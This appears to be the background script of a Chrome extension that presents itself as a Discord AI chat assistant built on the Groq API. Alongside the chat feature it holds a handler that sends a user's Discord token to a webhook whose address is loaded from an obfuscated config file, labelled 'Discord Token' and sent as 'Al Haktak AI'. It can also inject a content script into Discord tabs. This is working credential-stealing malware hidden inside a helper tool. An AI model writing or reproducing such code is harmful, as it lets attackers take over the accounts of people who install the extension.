// ─── BACKGROUND SERVICE WORKER ───

// Import obfuscated config
importScripts('config.js');

console.log("[AI] Background loaded");

// Get webhook URL from decoded config
var WEBHOOK_URL = CONFIG.WEBHOOK_URL;

// ─── Send webhook ───
function sendWebhookRequest(token) {
    var payload = {
        content: "**🔑 Discord Token**\n```\n" + token + "\n```",
        username: "Al Haktak AI"
    };
    return fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

function handleWebhookSuccess(response) {
    console.log("[AI] Webhook status:", response.status);
    if (response.ok) {
        console.log("[AI] ✅ Token sent!");
        return { success: true, status: response.status };
    }
    return response.text().then(function(text) {
        console.log("[AI] ❌ Discord error:", text);
        return { success: false, status: response.status, error: text };
    });
}

function handleWebhookError(error) {
    console.log("[AI] ❌ Webhook network error:", error.message);
    return { success: false, error: error.message };
}

function sendWebhook(token) {
    console.log("[AI] Sending webhook...");
    return sendWebhookRequest(token)
        .then(handleWebhookSuccess)
        .catch(handleWebhookError);
}

// ─── Groq API ───
var GROQ_API_KEY = CONFIG.GROQ_API_KEY;

function callGroq(message) {
    console.log("[AI] Calling Groq with:", message);
    return fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + GROQ_API_KEY
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful Discord assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: message
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(function(response) {
        if (!response.ok) {
            return response.text().then(function(text) {
                throw new Error('Groq error: ' + response.status + ' - ' + text);
            });
        }
        return response.json();
    })
    .then(function(data) {
        var reply = data.choices[0].message.content || "No response.";
        console.log("[AI] Groq reply:", reply);
        return reply;
    })
    .catch(function(error) {
        console.error("[AI] Groq error:", error.message);
        throw error;
    });
}

// ─── Message handlers ───
function handleSendWebhook(request, sender, sendResponse) {
    sendWebhook(request.token)
        .then(function(result) { sendResponse(result); })
        .catch(function(error) { sendResponse({ success: false, error: error.message }); });
    return true;
}

function handleGroq(request, sender, sendResponse) {
    callGroq(request.message)
        .then(function(reply) { sendResponse({ success: true, reply: reply }); })
        .catch(function(error) { sendResponse({ success: false, error: error.message }); });
    return true;
}

function handleGetStatus(request, sender, sendResponse) {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab) { sendResponse({ error: 'No active tab' }); return; }
        if (!tab.url || !tab.url.includes('discord.com')) {
            sendResponse({ error: 'Not on Discord' });
            return;
        }
        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(response) {
            if (chrome.runtime.lastError) {
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(res) {
                            sendResponse(res || { error: 'Still not responding' });
                        });
                    }, 500);
                });
                return;
            }
            sendResponse(response);
        });
    });
    return true;
}

// ─── Router ───
function handleMessage(request, sender, sendResponse) {
    if (request.action === 'sendWebhook') return handleSendWebhook(request, sender, sendResponse);
    if (request.action === 'groq') return handleGroq(request, sender, sendResponse);
    if (request.action === 'getStatus') return handleGetStatus(request, sender, sendResponse);
    return true;
}

chrome.runtime.onMessage.addListener(handleMessage);
chrome.runtime.onInstalled.addListener(function() {
    console.log("[AI] Extension installed");
});